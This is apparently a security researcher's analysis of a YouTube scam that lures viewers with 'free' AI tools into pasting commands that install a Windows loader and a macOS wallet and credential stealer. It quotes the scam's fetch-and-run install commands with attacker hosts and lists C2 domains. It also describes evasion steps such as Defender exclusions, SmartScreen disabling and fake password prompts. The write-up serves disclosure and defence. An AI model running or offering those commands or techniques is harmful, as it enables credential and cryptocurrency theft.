## A channel that sells "free" AI tools

The lure is a YouTube channel (`@bumtastik`) that pumps out one video after another promising the paid AI tools for free: **"Claude Code Opus 5.5 FREE"**, **"ChatGPT Plus for FREE (GPT-6 Astra)"**, **"Jailbreak Claude: UNCENSORED"**, Veo 3, ElevenLabs — all "`/free`", all "**NO CARD**". The presenter is an AI-generated avatar with an AI voice, and the videos pull real traction: tens of thousands of views each (one at 38K, another 21K), fresh uploads every few days.

Every video funnels to the same thing: a description link to a paste with a command to "activate" the free access. What it actually activates is malware.

Two things make this worse than a one-off scam:

- **The videos survive reporting.** They've been reported repeatedly and stay up, keep getting recommended, and keep collecting views.
- **The warnings get silenced.** Comments telling people "this is a virus, don't run it" are deleted, so the comment section looks clean to the next victim.

So the social layer is engineered too — not just the payload. If you landed here from one of those videos: **don't paste the command.** The rest of this write-up is what it does once you do.

## How it started

The video I started from had about 45,000 views (ID `3FyBGgkkjSw`); several others point to the same link. The description sends you to a Pastebin paste (`UthsJdis`) that offers one command per platform, presented as an "installer".

| OS | What the paste tells you to run |
| --- | --- |
| Windows | `iwr "hxxp://soft-storage[.]top/worker?=7341210743/ai-plugin" -UseBasicParsing` |
| macOS | a real `bun.sh/install` command, chained to `/bin/bash -c "$(curl -fsSL hxxp://192.162.199[.]249/9rmoz4cqi58)"` |

The real Bun installer at the front is there to make the command look legitimate.

### The Windows server checks your User-Agent

Opening `soft-storage[.]top/worker` in a browser returns nothing, and so does plain `curl`. It only answers with the exact User-Agent that PowerShell 7 sends: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) PowerShell/7.5.0`. That cheap check keeps sandboxes and scanners that crawl the link from getting the payload.

### The PowerShell stager

The script it returns (`mal.ps1`) does this:

1. Downloads a base64 blob from `hxxp://193.148.56[.]147/final_check?=7311907082/Unlim-api-plugin`, using a junk User-Agent (`SJSHDUWSJHIAO0WUI…`).
2. If it is running as admin, it adds Defender exclusions for `C:\Windows\Temp`, `C:\` and `C:\ProgramData`. It also turns SmartScreen off through four registry values, runs `gpupdate /force`, and launches the payload elevated as `C:\ProgramData\cmmd.exe`. Otherwise it runs it as `%TEMP%\cmmd.exe`.
3. Shows a fake `Checking 1%…100%` progress counter, then prints `Success | issues - 0!`.
4. Clears the clipboard and the Windows clipboard history, wipes the PSReadLine history file, and stops further history from being saved. The command you pasted is gone.

The base64 decodes byte-for-byte to the PE I analysed next (SHA-256 `85b6396c…20d7`).

## Windows payload: garbled Go

`cmmd.exe` is a 3 MB Go 1.23.1 binary built with [garble](https://github.com/burrowers/garble) — an open-source Go obfuscator that scrambles symbol names, strips build metadata and can encrypt string literals, turning a readable Go binary into a wall of noise. So function names in `main` are random (`main.zkWN8Ho3NqlvPT`, `main.qssh2XqU`…), and the only real name left is the source path, `SterlingSignalVentures/main.go`.

**`main.main` hides in padding.** It decompiles to 13,000 lines. Ghidra failed on it at first with `Response buffer size exceeded`, until I raised the decompiler's 50 MB payload limit (`DecompileOptions.setMaxPayloadMBytes`). Around 2,000 of its calls are `runtime.printint` / `printstring` filler, plus a decoy table printer (`mills: … men: … three-sum: …`).

**No readable API names.** The Windows APIs it uses are resolved at runtime through `LoadLibrary` and `GetProcAddress`. Their names come from a 39-entry table at `0x6c86c0`, where each name is encrypted with its own key. The decryptor (`main.qssh2XqU`) is control-flow flattened, so instead of reversing it, I emulated it.

- I mapped the PE into Unicorn and gave it a fake goroutine in `R14`, so Go's stack check passes.
- I stubbed the handful of runtime calls it needs (`mallocgc`, `makeslice`, `growslice`, `memmove`) with a bump allocator.
- Then I called it once per table entry using Go's register ABI.

All 78 calls (a DLL name and an API name per entry) came back clean:

| DLL | APIs |
| --- | --- |
| user32 | `CreateDesktopW`, `OpenDesktopW`, `CloseDesktop`, `GetDC`, `GetWindowDC`, `GetWindowRect`, `GetSystemMetrics`, `EnumDisplaySettingsW`, `GetKeyboardLayout(NameA/W)` … |
| gdi32 | `BitBlt`, `CreateCompatibleDC`, `CreateCompatibleBitmap`, `GetDIBits`, `SelectObject` … |
| ole32 / oleaut32 | `CoInitializeSecurity`, `CoCreateInstance`, `CoSetProxyBlanket`, `SysAllocString`, `VariantClear` … |
| kernel32 / advapi32 | `GetComputerNameExA`, `GetUserNameA`, `LookupPrivilegeValueW`, `ExitProcess` … |

That set fits a hidden-desktop screen-capture tool. It creates its own desktop, screenshots it with GDI and collects host and user info. The COM security calls look like WMI queries. The keyboard-layout APIs are the usual "don't run in certain countries" check.

<Note>What I could not close statically: no `main.*` function references networking APIs directly, and no other encrypted strings exist in the same format. Either the network layer goes through COM, or this build is one module of something larger. Detonating it answered this.</Note>

## Dynamic analysis: detonating the Windows loader

Static analysis stalled on the network question, so I ran the sample. Not in a convenience VM — in a disposable Windows guest on an **airgapped** Docker network, with [FakeNet-NG](https://github.com/mandiant/flare-fakenet-ng) sinkholing all DNS and TCP, Sysmon + Procmon + pktmon recording, and a per-tick screenshotter. The real C2 was never contacted. I cross-checked the result against a public [ANY.RUN](https://app.any.run/tasks/3d060605-4317-486c-af31-fa834af34580) run and [VirusTotal](https://www.virustotal.com/gui/file/85b6396c8af397f659ec0ff75df40bb3b8fdea7301a6d259745dffd65c1e20d7/details).

**It's a loader, not the screen-grabber the API table suggested.** All three sources agree: VirusTotal flags it 37/67 with threat categories *trojan / downloader* (label `trojan.remus/usbljb26`, tags `calls-wmi`, `long-sleeps`, `detect-debug-environment`), and ANY.RUN tracks it as a **Loader**. The hidden-desktop and GDI capture APIs load but never fire — with the C2 sinkholed and no valid task returned, it sits in its beacon loop and never reaches capture, persistence or a second stage.

### The beacon

`cmmd.exe` resolves its C2, then speaks HTTP over **non-standard ports 5930 and 5621** with a spoofed `Host: github.com` header — a cheap fronting trick so a glance at the traffic says "github".

<Pipeline>
  <Stage label="resolve C2" sub="sylpxe.click · netulse.sbs" />
  <Stage label="connect" sub="TCP 5930 / 5621" />
  <Stage label="POST /exports, /contacts" sub="Host: github.com (spoofed)" />
  <Stage label="register" sub="type=ping" />
  <Stage label="exfil" sub="type=0, encrypted file" />
  <Stage label="command" sub="reply hidden in a 405" />
</Pipeline>

The empty `access_token` is a first-contact registration ping. My FakeNet capture and the ANY.RUN run show the identical request — `POST http://github.com:5930/exports` from `mal.x86.exe` — which is how I know the beacon is the payload and not browser noise.

### What it did, and didn't

| observed | evidence |
| --- | --- |
| Beacon to `sylpxe[.]click` / `netulse[.]sbs` on TCP 5930 & 5621 | my DNS + pcap, ANY.RUN |
| `POST /exports` and `/contacts`, body `access_token=&type=ping` | FakeNet HTTP log, ANY.RUN |
| Loads `ws2_32, winhttp, user32, gdi32, ole32, bcryptprimitives` at runtime | Procmon (the static table, live) |
| Spawns `WmiPrvSE.exe` (WMI host recon) | ANY.RUN, VT tag `calls-wmi` |
| Heavy registry **recon** — 2929 `RegOpenKey`, 0 `RegSetValue` | Procmon |
| **No** persistence (no Run key, task or service), **no** file drop, **no** hidden desktop | Procmon + before/after diff, 40 screenshots all `Default` |

So the earlier static guess was half right: the capture APIs are real capability, but in the sinkholed run the primary observed behaviour is a loader beaconing for work.

### Against a live C2: it also exfiltrates

The sinkhole returns nothing, so the loader just pings. Captured against the **real** server (an `nginx` C2 at `186.194.50[.]58`, not my sink), the full exchange shows a loader *and* a stealer:

| step | request | meaning |
| --- | --- | --- |
| register | `POST /exports` · `access_token=&type=ping` | first contact, no token yet |
| exfil | `POST /exports` · `multipart/form-data`, `type=0`, `file="data"` = encrypted blob | uploads a host survey |
| command | reply `HTTP/1.1 405 Not Allowed` (nginx) with an encrypted body | the 405 is a decoy status; the real task rides in the body |

Both the upload and the reply are encrypted with a **custom stream cipher** — not the string decryptor's XOR. The binary has no `crypto/aes` or `crypto/rc4` routines, the ciphertext length isn't a 16-byte multiple so it's no block mode, and its index of coincidence sits at ~1.0 (random). Statically I couldn't pin the key: the cipher is inlined in the 13,000-line `main.main`, buried in garble decoy functions, and the full decompile runs out of memory.

### Cracking the crypto: it's ChaCha20

So I went dynamic. The loader detects debuggers and re-launches itself with `NtCreateUserProcess` to shake off a tracer, so I ran it under **x64dbg + ScyllaHide** (anti-anti-debug), forced the child to start suspended, and set a hardware breakpoint on the outbound buffer. That dropped me straight into the cipher — and its setup block gives it away:

<Figure src="/work/youtube-paste-stealer/chacha20-dump.webp" caption="The cipher's state in memory: the sigma constant 'expand 32-byte k' with the 256-bit key beside it, plus the plaintext beacon (tag/exp/hwid) and the multipart boundary — x64dbg dump." alt="x64dbg memory dump showing the ChaCha20 constant expand 32-byte k, the key bytes, and the decrypted tag=…&exp=…&hwid=… beacon." />

`expand 32-byte k` is the Salsa/ChaCha sigma for a 256-bit key — the "custom stream cipher" is **ChaCha20**. The 32-byte key sits right next to it, with an 8-byte nonce (original DJB ChaCha20, 64-bit nonce, counter 0). With `key = 941d3d09…fc6c1753` and `nonce = 8254a0e595f3d401` pulled from memory, the captured upload decrypts cleanly:

```yaml
# Info.yml  (the type=0 "survey" the loader uploads)
build:
  date: 08.10.2026
  tag: {tag}
  path: "C:\analysis\cmmd.exe"
  elevated: true
  ip-address: {ip}
  os: { version: Windows 11 Pro (10.0.26200) x64 }
  time-zone: UTC-7
  language: en-US
  computer-name: WIN-RJ9SUM77SCQ
  anti-virus: [ Defender … active ]
  hardware:
    gpu: [ 'Red Hat VirtIO GPU DOD controller' ]   # ← it sees the VM
    display: 1280x800
  software: [ 7-Zip 24.08, Python 3.12.10, … ]      # from the registry uninstall keys
```

So the `type=0` upload is a **full host profile** — OS build, elevation, locale, timezone, machine name, installed AV, GPU, display, and the installed-software list. The `{tag}`/`{ip}` are server-side template fields. The key is **ephemeral**: a fresh ChaCha20 key per session, sitting on the stack, so a key from one run can't decrypt another run's traffic.

### The C2's answer

The reply is keyed separately (the bot→C2 and C2→bot directions use different keys), so I breakpointed where the loader decrypts the 405 body and read the plaintext straight out of `rdi`:

```json
{"ping":-1,"load":[]}
```

<Figure src="/work/youtube-paste-stealer/c2-command.png" caption={'The decrypted C2 reply in the registers: RDI (and R15) point at the cleartext JSON command right after the loader decrypts the 405 body — x64dbg.'} alt={'x64dbg register pane: RDI and R15 point to the decrypted JSON command.'} />

That's the whole point of a loader — and the `load` array is **empty**. The C2 returned no second stage. `load` is the list of payloads to fetch and run; for our host it came back with nothing, most likely because the survey it just received screams sandbox (`VirtIO GPU`, a `C:\analysis` path, a bare software list). The hidden-desktop and screen-capture APIs are real capability the operator can switch on by putting an entry in `load` — they just didn't, for us.

That closes the loop end to end: video → paste → UA-gated stager → garbled Go loader → ChaCha20-encrypted host survey → C2 tasking. The only thing we never saw is a populated `load` — operator-controlled, and empty for a machine that looks like a lab.

### No persistence — yet

Across every detonation the loader wrote **no** Run key, scheduled task or service, and dropped nothing to disk. That isn't a gap in the analysis — it's the design. Persistence, the hidden-desktop capture, a stealer, ransomware: all of it lives in a stage-2 payload that only arrives when the operator puts an entry in `load`. On this host they chose not to. So "no persistence found" means *not this time* — the moment a victim looks worth keeping, the same `load` channel can install whatever they decide, with no change to the binary already sitting on the machine.

## macOS payload: a wallet stealer with its config in the clear (after one XOR)

`p7tp4i95c5x1fs96` is a universal Mach-O (x86_64 + arm64) written in C++. It is ad-hoc signed with the identifier `macos-stealer-v2-…`, so the authors at least named it honestly.

### Strings: 128-bit XOR, built inline

There are only 11 plain strings. Every other string is assembled on the stack from immediate values and XORed with a 128-bit key held in registers (`vpxor` / `vxorps`). Decompiling `main` took longer than ten minutes, so I took a cruder route. I swept every instruction in `__text` through Unicorn once, in address order, skipping calls and branches, and dumped `xmm` after each XOR. That gave 566 readable strings.

### The config: one rotating XOR

The C2 list wasn't in those strings. It sits in a 329-byte blob at the start of `__DATA,__data`. The blob starts with an 8-byte key, and the decoder XORs each byte with the key, rotating the key right by one bit per byte. Six lines of Python reproduce it, and both slices decode to the same config:

- build tag `mrdor`
- C2: `lewokodwqko[.]icu`, `shopguoerve[.]pro`, `dfsjfisafosdikfos[.]info`, `isosissisisossfiof[.]com` (all HTTPS)
- files to grab: `txt md csv json doc docx xls xlsx pdf cfg kdbx`
- password prompt: title `System Settings`, text `Please enter your password to continue`

### What it does

1. Runs `killall Terminal` to close the window you pasted into.
2. Asks for your password with an `osascript display dialog … with hidden answer` prompt titled "System Settings". It checks the answer with `dscl . -authonly` and keeps asking until it is correct.
3. Dumps `login.keychain-db` and reads the browsers' "Safe Storage" keys with `security find-generic-password -w`. That key plus PBKDF2 and AES (`CCKeyDerivationPBKDF` + `CCCrypt`) is how Chromium cookies and passwords are decrypted on macOS.
4. Collects data from:
   - **Chromium-family browsers:** Chrome, Brave, Edge, Arc, Opera, Vivaldi, Yandex, CocCoc. It takes cookies, Local Storage and IndexedDB, plus the `Local Extension Settings` of 203 extension IDs. I matched MetaMask, Phantom, Trust, Coinbase Wallet, Binance Chain, TronLink and the Bitwarden password manager by hand.
   - **Other browsers and apps:** Firefox, Safari `Cookies.binarycookies`, Apple Notes `NoteStore.sqlite`, Telegram `tdata` and Discord tokens.
   - **Wallets:** Electrum, Exodus, Atomic, Wasabi, Monero, Bitcoin/Litecoin/Dash/Dogecoin Core, Guarda, Binance and TonKeeper.
5. Uses a Finder AppleScript to copy matching documents from Desktop, Documents and Downloads, up to a size limit.
6. Zips everything with `ditto -c -k` and uploads it with `curl --fail -X POST`.
7. **Replaces Ledger Live and Trezor Suite.** It downloads a zip, runs `xattr -c` to clear quarantine, kills the real app and unzips the replacement into `/Applications`. The next time the victim opens their hardware-wallet app, it's the attacker's build.
8. **Persists.** It downloads an agent to `~/.hlpr/.agnt` and installs `~/Library/LaunchAgents/com.hlpr.agent.plist` with `RunAtLoad` and `KeepAlive`. It also turns on Do Not Disturb so no notification gives it away.

This matches what has been publicly reported about the AMOS / Atomic-stealer family: dialog phishing checked with `dscl`, a long wallet list, and more recently trojanised Ledger and Trezor apps and a persistent agent. I'm calling it "AMOS-like" because I have no family-level signature to confirm it.

## If you ran one of these

- **macOS:**
  - Remove `~/Library/LaunchAgents/com.hlpr.agent.plist` and `~/.hlpr/`.
  - Delete Ledger Live and Trezor Suite, then reinstall them from the vendors' sites.
  - Treat your login password, the keychain, every browser session and every wallet seed as stolen. Move funds from a clean machine.
- **Windows:**
  - Remove `cmmd.exe`.
  - Remove the Defender exclusions and undo the SmartScreen registry changes.
  - Rotate browser credentials from a clean device.
